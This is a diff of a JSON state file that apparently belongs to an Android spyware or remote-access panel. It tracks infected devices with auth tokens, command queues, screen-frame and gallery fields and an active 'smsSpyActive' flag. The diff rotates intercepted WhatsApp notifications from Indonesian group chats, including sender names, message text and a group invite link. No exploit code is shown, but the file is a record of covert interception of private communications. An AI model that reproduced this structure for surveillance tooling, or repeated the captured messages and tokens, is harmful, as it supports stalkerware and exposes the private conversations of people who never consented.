@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775046131214,
+    "lastSeen": 1775046134331,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15780 pesan dari 10 chat",
+        "time": "01/04 20:22",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046133140
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13584 pesan): ~ cewek bauti 👅☝🏻",
@@ -4011,14 +4019,6 @@
         "time": "01/04 20:10",
         "pkg": "com.whatsapp",
         "receivedAt": 1775045423248
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13438 pesan): ~ r",
-        "content": "💟 Stiker",
-        "time": "01/04 20:10",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045412295
       }
     ],
     "galleryPhotos": [],
@@ -4065,6 +4065,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13585 pesan): ~ Bot",
+        "content": "❌ Jawaban Salah untuk soal ini. Coba lagi!",
+        "time": "01/04 20:22",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046135063
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13584 pesan): ~ cewek bauti 👅☝🏻",
+        "content": "nenek kebingungan",
+        "time": "01/04 20:22",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046133177
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15780 pesan dari 10 chat",
+        "time": "01/04 20:22",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046133158
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13583 pesan): ~ Bot",
@@ -8040,30 +8064,6 @@
         "time": "01/04 20:10",
         "pkg": "com.whatsapp",
         "receivedAt": 1775045423331
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13439 pesan): ~ Fegg",
-        "content": "mana ?",
-        "time": "01/04 20:10",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045423230
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13438 pesan): ~ r",
-        "content": "💟 Stiker",
-        "time": "01/04 20:10",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045412236
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎LANGGANAN FT CEES 500P-5K BY WINZX [1] (92 pesan): ~ WINZX [3648]",
-        "content": "🔗 22 FEE 3K K PP 9K | https://chat.whatsapp.com/CLRXqFJ9YbrGmt7YNUrRaF?mode=gi_t\n\n-1 geseran gc",
-        "time": "01/04 20:10",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045412152
       }
     ],
     "galleryPhotos": [],
